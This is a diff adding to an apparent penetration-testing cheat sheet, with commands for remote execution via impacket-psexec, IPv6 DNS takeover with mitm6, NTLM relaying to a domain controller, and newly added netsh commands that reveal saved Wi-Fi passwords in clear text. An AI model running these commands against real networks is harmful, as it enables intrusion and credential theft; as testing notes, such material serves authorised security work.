@@ -126,3 +126,7 @@ impacket-psexec [DOMAIN]/[USER]:[PASS]@[RHOST]
 sudo python3 mitm6.py -d [DOMAIN]
 # we can relay captured credentials from that (usually triggered on a machine reboot) using ntlmrelayx
 impacket-ntlmrelayx -6 -t ldaps://[DC IP] -wh fakewpad.[DOMAIN] -l enumeration
+
+# finding loot - windows - wifi - grab wifi passwords
+netsh wlan show profile
+netsh wlan show profile <SSID> key=clear
